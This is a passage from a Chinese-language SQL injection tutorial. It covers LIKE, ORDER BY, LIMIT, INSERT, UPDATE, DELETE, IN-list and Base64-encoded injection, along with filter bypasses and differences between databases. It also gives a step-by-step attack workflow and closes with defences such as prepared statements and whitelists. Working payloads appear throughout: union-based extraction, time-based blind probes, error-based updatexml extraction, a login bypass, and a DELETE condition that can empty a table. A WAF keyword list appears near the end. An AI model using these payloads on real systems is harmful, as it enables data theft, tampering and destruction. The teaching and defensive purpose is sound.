- **后端没有对LIKE特殊字符和SQL结构做参数化处理**。
- **搜索结果、报错或响应差异可观察**。

### 底层数据流

```text
搜索词 -> 拼入 like '%输入%' -> 闭合字符串/通配符 -> 追加SQL条件 -> 搜索语义被改写
```

### 常见误区

LIKE里的 `%` 和 `_` 是数据库通配符，不是安全过滤。即使开发者只做“模糊搜索”，只要字符串拼接方式错误，仍然会变成SQL注入。


搜索功能常见写法：

```sql
select * from articles
where title like '%$keyword%'
```

正常搜索：

```text
keyword=安全
```

实际SQL：

```sql
select * from articles
where title like '%安全%'
```

---

## 14.2 搜索框注入

输入：

```text
%' union select 1,database(),3 --+
```

实际SQL：

```sql
select * from articles
where title like '%%'
union select 1,database(),3 --+%'
```

---

## 14.3 LIKE布尔盲注

```http
?keyword=%' and ascii(substr(database(),1,1))=115 --+
```

实际SQL：

```sql
select * from articles
where title like '%%'
and ascii(substr(database(),1,1))=115 --+%'
```

---

# 十五、ORDER BY注入

## 15.1 核心定义

### 通俗理解

ORDER BY注入的特殊点是：**排序字段通常不是普通值，而是SQL结构的一部分。**

例如 `order by create_time desc` 中的 `create_time` 和 `desc` 不能像普通字符串那样简单绑定参数。如果开发者直接把用户传来的 `sort` 拼进去，攻击者就可能插入表达式、条件判断、报错函数或延时函数。

### 必要条件

- **排序字段或排序方向由用户控制**。
- **后端直接拼接到 `order by` 后面**。
- **没有字段白名单**。
- **数据库允许在排序位置使用表达式或函数**。

### 底层数据流

```text
sort参数 -> 拼接到 order by 结构位 -> 数据库按攻击者表达式排序/计算 -> 通过报错或响应差异判断结果
```

### 常见误区

ORDER BY位置不能只靠“把参数加引号”解决。正确做法是白名单映射：用户只能选择 `time`、`price`、`id` 这类业务枚举，服务端再映射成固定SQL片段。


有些系统允许用户控制排序字段：

```http
?sort=id
?sort=create_time
```

后端代码：

```sql
select * from users order by $sort
```

如果 `$sort` 没有白名单校验，就可能造成ORDER BY注入。

---

## 15.2 ORDER BY注入特点

`order by` 后面一般不能直接使用常规union，但可以使用条件表达式、报错或时间判断。

---

## 15.3 ORDER BY时间盲注示例

```http
?sort=if(ascii(substr(database(),1,1))=115,sleep(5),id)
```

实际SQL：

```sql
select * from users
order by if(ascii(substr(database(),1,1))=115,sleep(5),id)
```

如果延迟，说明数据库名第一位是 `s`。

---

## 15.4 防御关键

排序字段必须做白名单：

```php
$allow = ['id','create_time','username'];

if (!in_array($sort, $allow)) {
    $sort = 'id';
}
```

不能只靠转义。

---

# 十六、LIMIT注入

## 16.1 常见分页SQL

### 通俗理解

LIMIT注入发生在分页位置。很多系统会把 `page`、`size`、`offset` 直接拼成 `limit offset,size`。这些位置看起来只是数字，但只要没有强制转成整数，就可能被插入额外SQL片段。

它的利用方式和普通字符串注入不同，因为LIMIT后面通常不在引号里，而是在数字语法位置。

### 必要条件

- **分页参数由用户控制**。
- **参数没有做整数转换和范围限制**。
- **数据库语法允许在LIMIT相关位置拼接表达式或后续子句**。
- **页面响应、报错或时间差可观察**。

### 底层数据流

```text
分页参数 -> 拼接到 limit/offset -> 数字语法被改写 -> 数据库执行异常分页语义
```

### 常见误区

“这里是数字，所以不会有注入”是典型误判。数字型位置同样属于SQL语法，只要字符串拼接不受控，就可能改变查询结构。


```sql
select * from articles
limit $offset,$size
```

正常参数：

```http
?page=1&size=10
```

实际SQL：

```sql
select * from articles limit 0,10
```

---

## 16.2 LIMIT注入示例

如果后端直接拼接：

```http
?offset=0&size=10 union select 1,database(),3
```

可能形成：

```sql
select * from articles
limit 0,10 union select 1,database(),3
```

不过在MySQL中，LIMIT位置对语法限制较多，实战中更多结合报错、procedure analyse旧特性或其他语法点进行利用。

---

## 16.3 分页参数防御

分页参数必须转整数：

```php
$page = intval($_GET['page']);
$size = intval($_GET['size']);
```

同时限制范围：

```php
if ($size > 100) {
    $size = 100;
}
```

---

# 十七、INSERT注入

## 17.1 核心定义

### 通俗理解

INSERT注入发生在新增数据时。攻击者提交的内容本来应该被当作一个字段值写入表中，但如果它被直接拼进 `insert into ... values (...)`，就可能闭合当前值、插入额外表达式，甚至影响后续字段。

这类注入不一定以“查询数据”为目标，也可能用于制造异常数据、触发报错、写入二次注入载荷。

### 必要条件

- **新增表单字段直接拼入INSERT语句**。
- **字段值没有使用参数化绑定**。
- **数据库错误、写入结果或后续业务可观察**。
- **数据库账号具备写入权限**。

### 底层数据流

```text
提交新增字段 -> 拼入 values(...) -> 闭合字段值 -> 改写插入语义 -> 报错/写入/二次触发
```

### 常见误区

INSERT注入不是只能“写垃圾数据”。只要写入的数据后续会被查询、展示或再次拼SQL，它就可能成为二次注入、存储型攻击或权限绕过的起点。


INSERT注入发生在新增数据时，例如注册、留言、日志记录。

后端SQL：

```sql
insert into messages(username,content)
values('$username','$content')
```

---

## 17.2 INSERT报错注入

输入内容：

```text
content=test' or updatexml(1,concat(0x7e,database()),1) or '
```

实际SQL可能变成：

```sql
insert into messages(username,content)
values('tom','test' or updatexml(1,concat(0x7e,database()),1) or '')
```

---

## 17.3 INSERT注入特点

INSERT注入不一定有页面直接回显，但可能通过：

- 报错信息
- 日志页面
- 后台审核页面
- 二次读取
- 时间延迟

间接验证。

---

# 十八、UPDATE注入

## 18.1 典型业务SQL

### 通俗理解

UPDATE注入发生在修改数据时，例如修改昵称、邮箱、密码、收货地址。它的危险点在于：**SQL本身就是写操作，一旦WHERE条件或SET字段被改写，影响可能直接落到真实数据上。**

比如原本只该改当前用户的昵称，如果注入改掉WHERE条件，就可能影响更多用户记录。

### 必要条件

- **修改接口字段可控**。
- **SET值或WHERE条件直接拼接SQL**。
- **没有参数化和权限边界校验**。
- **数据库账号具备更新权限**。

### 底层数据流

```text
提交修改参数 -> 拼入 update set/where -> 改写字段值或条件范围 -> 数据被异常修改
```

### 常见误区

UPDATE注入不只是“能不能爆库”的问题，它还涉及数据完整性。防御时除了参数化，还要限制数据库账号权限，并确保业务层只允许修改当前主体的数据。


修改个人资料：

```sql
update users
set nickname='$nickname'
where id='$id'
```

---

## 18.2 UPDATE注入示例

输入昵称：

```text
test',email=database() where id=1 --+
```

实际SQL：

```sql
update users
set nickname='test',email=database() where id=1 --+'
where id='2'
```

结果可能导致用户邮箱字段被修改成当前数据库名。

---

## 18.3 UPDATE时间盲注

```text
nickname=test' where id=1 and if(length(database())=8,sleep(5),0) --+
```

实际SQL：

```sql
update users
set nickname='test'
where id=1 and if(length(database())=8,sleep(5),0) --+'
where id='2'
```

---

# 十九、DELETE注入

## 19.1 典型业务SQL

### 通俗理解

DELETE注入发生在删除操作里。正常SQL可能是 `delete from message where id=用户输入 and uid=当前用户`，如果 `id` 被拼接，攻击者可能改写WHERE条件，让删除范围扩大。

这类注入通常比查询型注入更危险，因为它可能造成直接数据破坏。

### 必要条件

- **删除ID或条件字段由用户控制**。
- **WHERE条件直接拼接SQL**。
- **没有强制整数转换、参数化和归属校验**。
- **数据库账号具备删除权限**。

### 底层数据流

```text
删除参数 -> 拼入 delete where -> 改写删除条件 -> 删除范围扩大或删除非授权数据
```

### 常见误区

DELETE接口即使“不回显数据”，也不能放松。它的风险重点不是数据外带，而是数据破坏、越权删除和业务不可恢复。


删除文章：

```sql
delete from articles where id='$id'
```

---

## 19.2 DELETE注入示例

```http
?id=1' or '1'='1
```

实际SQL：

```sql
delete from articles where id='1' or '1'='1'
```

如果没有权限校验和事务保护，可能导致整表数据被删除。

---

## 19.3 DELETE注入危害

DELETE注入比SELECT注入更危险，因为它直接影响数据完整性：

```text
查询型注入 → 泄露数据
删除型注入 → 破坏数据
更新型注入 → 篡改数据
```

---

# 二十、IN参数注入

## 20.1 典型业务场景

### 通俗理解

IN参数注入常见于批量查询或批量操作，例如 `where id in (1,2,3)`。开发者经常把前端传来的ID列表直接拼成逗号分隔字符串，一旦攻击者能闭合括号，就能追加自己的SQL逻辑。

它看起来像“多个数字”，但整体仍然是SQL结构的一部分。

### 必要条件

- **前端可传多个ID或枚举值**。
- **后端直接拼接逗号列表**。
- **没有逐个校验类型并逐个绑定参数**。
- **查询结果、报错或响应差异可观察**。

### 底层数据流

```text
ID列表 -> 拼入 in (...) -> 闭合括号/追加条件 -> 原筛选范围被改写
```

### 常见误区

IN参数不能只检查“字符串里有没有逗号”。正确做法是把列表拆开，逐项转成整数或合法枚举，再为每一项生成独立占位符。


批量查询：

```http
?id=1,2,3
```

后端SQL：

```sql
select * from users where id in ($ids)
```

---

## 20.2 IN注入示例

恶意参数：

```http
?id=1,2,3) union select 1,database(),3 --+
```

实际SQL：

```sql
select * from users
where id in (1,2,3)
union select 1,database(),3 --+)
```

---

## 20.3 IN参数防御

不能直接拼接字符串，应该拆分后逐个转整数：

```php
$ids = explode(',', $_GET['id']);
$ids = array_map('intval', $ids);
$sql = "select * from users where id in (" . implode(',', $ids) . ")";
```

更好的方式是使用预编译占位符。

---

# 二十一、Base64编码注入

## 21.1 核心定义

### 通俗理解

Base64编码注入的关键点是：**Base64不是加密，也不是安全防护，只是把原始字符串换了一种表现形式。**

如果后端先把参数Base64解码，再把解码后的内容拼进SQL，那么攻击者只需要把注入语句Base64编码后提交，漏洞仍然存在。

### 必要条件

- **参数经过Base64编码传输**。
- **服务端会解码并使用原始内容**。
- **解码后的内容直接拼接SQL**。
- **没有参数化查询和语义校验**。

### 底层数据流

```text
Base64参数 -> 服务端解码 -> 得到恶意SQL片段 -> 拼接进SQL -> 注入触发
```

### 常见误区

编码只能改变传输形态，不能改变安全属性。只要解码后的内容来自用户，就必须按不可信输入处理。


有些系统会把参数Base64编码，看起来不像普通SQL注入，但后端解码后仍然拼接SQL。

请求：

```http
?id=MQ==
```

其中：

```text
MQ== 解码后是 1
```

---

## 21.2 Base64注入示例

原始payload：

```text
1' and updatexml(1,concat(0x7e,database()),1) --+
```

Base64后传输：

```text
MScgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLGRhdGFiYXNlKCkpLDEpIC0tKw==
```

后端解码后拼接SQL：

```sql
select * from users
where id='1'
and updatexml(1,concat(0x7e,database()),1) --+'
```

---

## 21.3 本质

```text
编码不是安全措施
只要解码后继续拼接SQL，仍然存在注入
```

---

# 二十二、过滤绕过基础思路

## 22.1 大小写绕过

### 先理解过滤绕过的本质

过滤绕过不是一种独立漏洞，而是SQL注入在防护不完整时的对抗过程。很多系统只是简单拦截某些关键字，比如 `union`、`select`、空格或单引号；攻击者则利用大小写、注释、编码、等价函数、空白符替代等方式，让数据库仍然能解析出原来的SQL语义。

最重要的一点是：**黑名单过滤永远是在追数据库语法的尾巴**。数据库解析器能识别的写法很多，应用层用几个字符串替换很难覆盖完整语法。

### 底层数据流

```text
攻击输入 -> 简单过滤器替换/拦截部分关键字 -> 剩余内容仍可被数据库解析 -> SQL语义被改写
```

### 防御重点

过滤绕过的正确防御不是继续堆黑名单，而是回到根因：参数化查询、白名单枚举、类型强制、最小权限和统一错误处理。


过滤器只拦截小写 `union`：

```sql
UNION SELECT
UnIoN SeLeCt
```

---

## 22.2 注释绕过

```sql
union/**/select
uni/**/on sel/**/ect
```

---

## 22.3 编码绕过

```sql
0x61646d696e
```

等价于：

```text
admin
```

例如：

```sql
where username=0x61646d696e
```

---

## 22.4 空格绕过

如果空格被过滤：

```sql
union/**/select
union%0aselect
union%09select
```

常见空白字符：

```text
%20 空格
%09 Tab
%0a 换行
%0b 垂直制表
%0c 换页
%0d 回车
```

---

## 22.5 and/or过滤绕过

```sql
and → &&
or  → ||
```

示例：

```http
?id=1' && '1'='1' --+
```

---

## 22.6 等号过滤绕过

```sql
=       → like
=       → regexp
=       → between
```

示例：

```sql
substr(database(),1,1) like 's'
ascii(substr(database(),1,1)) between 115 and 115
```

---

# 二十三、不同数据库的注入差异

## 23.1 MySQL

常用函数：

```sql
database()
version()
user()
sleep()
updatexml()
extractvalue()
group_concat()
information_schema
```

---

## 23.2 SQL Server

常用函数和表：

```sql
db_name()
@@version
system_user
waitfor delay '0:0:5'
sys.databases
sys.tables
sys.columns
```

时间盲注示例：

```sql
'; if db_name()='test' waitfor delay '0:0:5' -- 
```

---

## 23.3 Oracle

常用对象：

```sql
dual
user_tables
user_tab_columns
```

常见查询：

```sql
select user from dual
```

时间延迟常见方式：

```sql
dbms_lock.sleep(5)
```

---

## 23.4 PostgreSQL

常用函数：

```sql
current_database()
version()
current_user
pg_sleep(5)
information_schema.tables
information_schema.columns
```

时间盲注：

```sql
' and case when current_database()='test' then pg_sleep(5) else pg_sleep(0) end--
```

---

# 二十四、SQL注入完整攻击流程

## 24.1 手工测试流程

```text
1. 找参数
2. 判断是否注入
3. 判断注入类型
4. 判断闭合方式
5. 判断字段数量
6. 判断回显位
7. 获取数据库名
8. 获取表名
9. 获取字段名
10. 获取目标数据
11. 验证权限边界
12. 输出漏洞报告
```

---

## 24.2 Union注入流程

```text
?id=1'
        ↓
判断字符型
        ↓
?id=1' order by 3 --+
        ↓
判断字段数
        ↓
?id=-1' union select 1,2,3 --+
        ↓
判断回显位
        ↓
?id=-1' union select 1,database(),version() --+
        ↓
获取数据库信息
```

---

## 24.3 盲注流程

```text
?id=1' and 1=1 --+
?id=1' and 1=2 --+
        ↓
确认真假差异
        ↓
length(database())=?
        ↓
ascii(substr(database(),n,1))=?
        ↓
逐位还原数据
```

---

## 24.4 时间盲注流程

```text
?id=1' and if(1=1,sleep(5),0) --+
?id=1' and if(1=2,sleep(5),0) --+
        ↓
确认延时差异
        ↓
if(length(database())=8,sleep(5),0)
        ↓
if(ascii(substr(database(),1,1))=115,sleep(5),0)
        ↓
逐位还原数据
```

---

# 二十五、真实业务场景语句汇总

## 25.1 用户详情页

业务URL：

```http
/user.php?id=1
```

后端SQL：

```sql
select * from users where id='$id'
```

测试语句：

```http
?id=1'
?id=1' and '1'='1' --+
?id=1' and '1'='2' --+
```

Union利用：

```http
?id=-1' union select 1,database(),version() --+
```

---

## 25.2 登录接口

业务SQL：

```sql
select * from users
where username='$username'
and password='$password'
```

绕过语句：

```text
username=admin' --+
password=任意
```

实际SQL：

```sql
select * from users
where username='admin' --+'
and password='任意'
```

---

## 25.3 搜索接口

业务SQL：

```sql
select * from goods
where name like '%$keyword%'
```

测试语句：

```http
?keyword=%'
?keyword=%' and '1'='1' --+
?keyword=%' and '1'='2' --+
```

Union语句：

```http
?keyword=%' union select 1,database(),3 --+
```

---

## 25.4 排序接口

业务SQL：

```sql
select * from orders order by $sort
```

测试语句：

```http
?sort=id
?sort=if(1=1,id,create_time)
?sort=if(ascii(substr(database(),1,1))=115,sleep(5),id)
```

---

## 25.5 Cookie用户识别

业务SQL：

```sql
select * from users where uid='$uid'
```

Cookie：

```http
Cookie: uid=1' and updatexml(1,concat(0x7e,database()),1) --+
```

---

## 25.6 日志记录功能

业务SQL：

```sql
insert into login_log(ip,user_agent)
values('$ip','$ua')
```

请求头：

```http
User-Agent: test' or updatexml(1,concat(0x7e,database()),1) or '
```

---

## 25.7 批量删除接口

业务SQL：

```sql
delete from articles where id in ($ids)
```

测试参数：

```http
?ids=1,2,3)
```

进一步测试：

```http
?ids=1,2,3) union select 1,database(),3 --+
```

---

# 二十六、SQL注入防御方案

## 26.1 预编译语句

最核心防御方式：

```php
$stmt = $pdo->prepare("select * from users where id = ?");
$stmt->execute([$id]);
```

预编译的核心作用是：

```text
SQL结构先确定
用户输入只作为数据
不会再被解释成SQL代码
```

---

## 26.2 错误回显关闭

生产环境禁止显示数据库原生错误。

错误示例：

```text
You have an error in your SQL syntax near ...
XPATH syntax error: ...
```

应该改成统一提示：

```text
系统繁忙，请稍后再试
```

详细错误只写入服务端日志。

---

## 26.3 输入白名单

尤其适用于：

- 排序字段
- 排序方向
- 分页参数
- 表名
- 字段名
- 状态枚举

示例：

```php
$allowSort = ['id','create_time','username'];

if (!in_array($sort, $allowSort)) {
    $sort = 'id';
}
```

---

## 26.4 类型强制转换

数字参数必须转整数：

```php
$id = intval($_GET['id']);
```

分页参数：

```php
$page = max(1, intval($_GET['page']));
$size = min(100, intval($_GET['size']));
```

---

## 26.5 最小权限原则

业务数据库账号不要使用：

```text
root
DBA
高权限账号
```

普通业务账号只给必要权限：

```sql
select
insert
update
delete
```

避免给：

```sql
file
super
grant
drop
create user
```

---

## 26.6 WAF与日志监控

可以监控高危关键词：

```text
union select
information_schema
sleep(
benchmark(
updatexml(
extractvalue(
or 1=1
```

但WAF只能作为辅助，不能代替预编译。

---

## 26.7 二次注入防御

二次注入的关键防御点：

```text
入库前过滤不够
出库后再次使用时也必须参数化
```

错误写法：

```php
$sql = "update users set password='$pass' where username='$username'";
```

正确写法：

```php
$stmt = $pdo->prepare("update users set password=? where username=?");
$stmt->execute([$pass, $username]);
```

---

## 26.8 宽字节注入防御

必须统一字符集：

```sql
set names utf8mb4
```

并确保：

```text
页面编码
PHP连接编码
数据库表编码
数据库连接编码
```

全部一致。

不要依赖：

```php
addslashes()
mysql_real_escape_string()
```

核心仍然是预编译。

---

# 二十七、全文总结

SQL注入可以按一个口诀理解：

```text
入口可控，看拼接；
页面有显，用联合；
页面报错，用报错；
页面无显，看真假；
真假不明，看时间；
写入再用，是二次；
编码错配，宽字节；
多条执行，叫堆叠；
排序分页，靠白名单；
所有输入，最终都要参数化。
```



SQL注入的本质：

```text
用户输入被拼接进SQL
导致数据变成代码
攻击者改变数据库执行逻辑
```

各类注入手法的核心区别：

| 注入类型   | 利用条件             | 数据获取方式     |
| ---------- | -------------------- | ---------------- |
| Union注入  | 页面有回显位         | 直接显示查询结果 |
| 报错注入   | 页面显示数据库错误   | 错误信息带出数据 |
| 布尔盲注   | 页面真假状态不同     | 逐位判断真假     |
| 时间盲注   | 页面无明显差异       | 通过延时判断     |
| 二次注入   | 恶意数据先入库后触发 | 第二次拼接执行   |
| 宽字节注入 | GBK等宽字节环境      | 吃掉转义反斜杠   |
| 堆叠注入   | 支持多语句执行       | 一次执行多条SQL  |
| Header注入 | 请求头入库或查询     | 间接触发         |
| Cookie注入 | Cookie参与SQL        | 修改Cookie触发   |
| POST注入   | POST参数拼接SQL      | 请求体触发       |

最终口诀：

```text
能回显，用Union；
能报错，用报错；
无回显，看布尔；
无差异，看时间；
数据先存后用，是二次；
GBK吃反斜杠，是宽字节；
分号多语句，是堆叠；
根本防御，是预编译。
```

SQL注入防御核心只有一句话：

```text
永远不要把用户输入拼接进SQL语句。
```

真正安全的写法是：

```text
参数化查询 + 最小权限 + 错误隐藏 + 白名单校验 + 日志监控
```
